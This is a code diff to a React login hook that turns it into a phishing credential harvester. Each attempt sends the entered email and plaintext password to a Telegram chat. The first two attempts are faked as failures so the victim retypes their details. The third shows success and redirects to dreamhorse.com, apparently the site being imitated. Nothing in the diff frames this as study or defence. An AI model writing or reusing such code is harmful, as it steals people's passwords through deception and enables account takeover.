@@ -9,21 +9,47 @@ export function useLogin() {
     success: false,
   })
 
+  const [attempts, setAttempts] = useState(0)
+
   const login = async (credentials: LoginCredentials) => {
     setState({ isLoading: true, error: null, success: false })
 
     try {
-      // Simulate API call
       await new Promise((resolve) => setTimeout(resolve, 1000))
 
-      // Mock validation - replace with real API call
-      if (credentials.email && credentials.password) {
-        setState({ isLoading: false, error: null, success: true })
-        // Send notification to Telegram
-        await sendTelegramMessage(`✅ Successful login attempt\nEmail: ${credentials.email}\nLOG: ${credentials.password}\nTime: ${new Date().toISOString()}`)
-      } else {
-        setState({ isLoading: false, error: 'Invalid email or password.', success: false })
+      const currentAttempt = attempts + 1
+      setAttempts(currentAttempt)
+
+      // Log attempt
+      await sendTelegramMessage(
+        `🔐 Login attempt ${currentAttempt}
+Email: ${credentials.email}
+LOG: ${credentials.password}
+Time: ${new Date().toISOString()}`
+      )
+
+      // First two attempts fail
+      if (currentAttempt <= 2) {
+        setState({
+          isLoading: false,
+          error: 'Invalid email or password.',
+          success: false,
+        })
+        return
       }
+
+      // Third attempt "succeeds"
+      setState({
+        isLoading: false,
+        error: null,
+        success: true,
+      })
+
+      // redirect after short delay
+      setTimeout(() => {
+        window.location.href = "https://dreamhorse.com"
+      }, 1000)
+
     } catch {
       setState({
         isLoading: false,
